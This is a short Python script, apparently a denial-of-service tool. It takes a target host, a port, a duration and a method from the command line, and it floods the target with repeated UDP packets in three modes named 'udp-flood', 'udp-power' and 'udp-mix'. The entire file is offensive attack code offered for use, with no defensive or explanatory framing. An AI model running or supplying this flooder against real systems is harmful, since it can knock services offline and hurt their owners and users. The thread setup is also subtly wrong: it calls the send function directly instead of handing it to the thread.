import sys
import socket
import threading
import time

host = str(sys.argv[1])
port = int(sys.argv[2])
time_to_attack = int(sys.argv[3])  # Tiempo en segundos
method = str(sys.argv[4])

loops = 10000
start_time = time.time()  # Tiempo de inicio
def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while time.time() - start_time < time_to_attack:
            s.send(b"\x99" * amplifier)
    except: return s.close()

def attack_HQ():
    if method == "udp-flood":
        while time.time() - start_time < time_to_attack:
            for sequence in range(loops):
                threading.Thread(target=send_packet(375), daemon=True).start()
    if method == "udp-power":
        while time.time() - start_time < time_to_attack:
            for sequence in range(loops):
                threading.Thread(target=send_packet(750), daemon=True).start()
    if method == "udp-mix":
        while time.time() - start_time < time_to_attack:
            for sequence in range(loops):
                threading.Thread(target=send_packet(375), daemon=True).start()
                threading.Thread(target=send_packet(750), daemon=True).start()

attack_HQ()
